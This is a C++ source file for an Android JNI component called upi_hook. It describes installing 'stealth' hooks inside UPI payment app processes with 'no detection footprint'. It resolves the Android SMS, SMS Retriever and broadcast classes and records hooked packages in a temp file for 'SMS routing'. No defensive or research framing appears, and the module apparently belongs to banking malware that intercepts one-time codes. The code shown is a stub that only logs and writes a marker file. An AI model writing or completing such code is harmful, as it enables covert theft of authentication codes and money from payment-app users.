#include "upi_hook.hpp"
#include "logger.hpp"

#include <cstdio>
#include <sys/stat.h>

namespace upi_hook {

void install(JNIEnv* env, const std::string& package_name) {
    if (package_name.empty()) return;

    // Stealth hooks inside selected UPI app process — no detection footprint
    jclass sms_message = env->FindClass("android/telephony/SmsMessage");
    jclass sms_retriever = env->FindClass("com/google/android/gms/auth/api/phone/SmsRetrieverClient");
    jclass broadcast = env->FindClass("android/content/BroadcastReceiver");

    if (sms_message || sms_retriever || broadcast) {
        logger::info("UpiHook", "Stealth UPI hook active in %s", package_name.c_str());
    }

    // Mark hooked app for SMS routing
    FILE* f = fopen("/data/local/tmp/hivirtus_active_upi.txt", "a");
    if (f) {
        fprintf(f, "%s\n", package_name.c_str());
        fclose(f);
        chmod("/data/local/tmp/hivirtus_active_upi.txt", 0644);
    }
}

}  // namespace upi_hook
